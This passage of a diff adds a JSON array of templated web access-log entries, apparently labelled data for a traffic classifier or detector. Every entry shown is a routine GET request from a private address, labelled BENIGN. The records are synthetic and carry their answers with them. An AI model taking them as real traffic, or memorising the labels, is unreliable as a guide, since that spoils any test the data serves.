+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.134 - - [01/Jun/2026:10:04:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.135 - - [01/Jun/2026:10:04:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.136 - - [01/Jun/2026:10:04:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.137 - - [01/Jun/2026:10:04:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.138 - - [01/Jun/2026:10:04:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.139 - - [01/Jun/2026:10:04:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.140 - - [01/Jun/2026:10:04:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.141 - - [01/Jun/2026:10:04:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.142 - - [01/Jun/2026:10:04:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.143 - - [01/Jun/2026:10:04:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.144 - - [01/Jun/2026:10:04:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.145 - - [01/Jun/2026:10:04:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.146 - - [01/Jun/2026:10:04:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.147 - - [01/Jun/2026:10:04:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.148 - - [01/Jun/2026:10:04:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.149 - - [01/Jun/2026:10:04:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.150 - - [01/Jun/2026:10:04:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.151 - - [01/Jun/2026:10:04:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.152 - - [01/Jun/2026:10:04:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.153 - - [01/Jun/2026:10:04:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.154 - - [01/Jun/2026:10:04:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.155 - - [01/Jun/2026:10:04:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.156 - - [01/Jun/2026:10:04:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.157 - - [01/Jun/2026:10:04:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.158 - - [01/Jun/2026:10:04:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.159 - - [01/Jun/2026:10:04:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.160 - - [01/Jun/2026:10:05:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.161 - - [01/Jun/2026:10:05:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.162 - - [01/Jun/2026:10:05:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.163 - - [01/Jun/2026:10:05:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.164 - - [01/Jun/2026:10:05:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.165 - - [01/Jun/2026:10:05:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.166 - - [01/Jun/2026:10:05:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.167 - - [01/Jun/2026:10:05:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.168 - - [01/Jun/2026:10:05:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.169 - - [01/Jun/2026:10:05:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.170 - - [01/Jun/2026:10:05:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.171 - - [01/Jun/2026:10:05:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.172 - - [01/Jun/2026:10:05:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.173 - - [01/Jun/2026:10:05:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.174 - - [01/Jun/2026:10:05:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.175 - - [01/Jun/2026:10:05:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.176 - - [01/Jun/2026:10:05:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.177 - - [01/Jun/2026:10:05:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.178 - - [01/Jun/2026:10:05:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.179 - - [01/Jun/2026:10:05:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.180 - - [01/Jun/2026:10:05:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.181 - - [01/Jun/2026:10:05:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.182 - - [01/Jun/2026:10:05:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.183 - - [01/Jun/2026:10:05:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.184 - - [01/Jun/2026:10:05:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.185 - - [01/Jun/2026:10:05:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.186 - - [01/Jun/2026:10:05:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.187 - - [01/Jun/2026:10:05:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.188 - - [01/Jun/2026:10:05:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.189 - - [01/Jun/2026:10:05:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.190 - - [01/Jun/2026:10:06:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.191 - - [01/Jun/2026:10:06:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.192 - - [01/Jun/2026:10:06:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.193 - - [01/Jun/2026:10:06:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.194 - - [01/Jun/2026:10:06:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.195 - - [01/Jun/2026:10:06:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.196 - - [01/Jun/2026:10:06:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.197 - - [01/Jun/2026:10:06:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.198 - - [01/Jun/2026:10:06:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.199 - - [01/Jun/2026:10:06:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.200 - - [01/Jun/2026:10:06:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.201 - - [01/Jun/2026:10:06:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.202 - - [01/Jun/2026:10:06:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.203 - - [01/Jun/2026:10:06:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.204 - - [01/Jun/2026:10:06:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.205 - - [01/Jun/2026:10:06:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.206 - - [01/Jun/2026:10:06:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.207 - - [01/Jun/2026:10:06:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.208 - - [01/Jun/2026:10:06:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.209 - - [01/Jun/2026:10:06:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.10 - - [01/Jun/2026:10:06:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.11 - - [01/Jun/2026:10:06:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.12 - - [01/Jun/2026:10:06:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.13 - - [01/Jun/2026:10:06:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.14 - - [01/Jun/2026:10:06:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.15 - - [01/Jun/2026:10:06:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.16 - - [01/Jun/2026:10:06:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.17 - - [01/Jun/2026:10:06:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.18 - - [01/Jun/2026:10:06:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.19 - - [01/Jun/2026:10:06:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.20 - - [01/Jun/2026:10:07:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.21 - - [01/Jun/2026:10:07:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.22 - - [01/Jun/2026:10:07:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.23 - - [01/Jun/2026:10:07:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.24 - - [01/Jun/2026:10:07:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.25 - - [01/Jun/2026:10:07:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.26 - - [01/Jun/2026:10:07:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.27 - - [01/Jun/2026:10:07:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.28 - - [01/Jun/2026:10:07:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.29 - - [01/Jun/2026:10:07:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.30 - - [01/Jun/2026:10:07:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.31 - - [01/Jun/2026:10:07:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.32 - - [01/Jun/2026:10:07:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.33 - - [01/Jun/2026:10:07:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.34 - - [01/Jun/2026:10:07:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.35 - - [01/Jun/2026:10:07:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.36 - - [01/Jun/2026:10:07:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.37 - - [01/Jun/2026:10:07:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.38 - - [01/Jun/2026:10:07:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.39 - - [01/Jun/2026:10:07:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.40 - - [01/Jun/2026:10:07:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.41 - - [01/Jun/2026:10:07:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.42 - - [01/Jun/2026:10:07:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.43 - - [01/Jun/2026:10:07:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.44 - - [01/Jun/2026:10:07:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.45 - - [01/Jun/2026:10:07:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.46 - - [01/Jun/2026:10:07:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.47 - - [01/Jun/2026:10:07:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.48 - - [01/Jun/2026:10:07:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.49 - - [01/Jun/2026:10:07:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.50 - - [01/Jun/2026:10:08:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.51 - - [01/Jun/2026:10:08:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.52 - - [01/Jun/2026:10:08:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.53 - - [01/Jun/2026:10:08:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.54 - - [01/Jun/2026:10:08:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.55 - - [01/Jun/2026:10:08:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.56 - - [01/Jun/2026:10:08:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.57 - - [01/Jun/2026:10:08:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
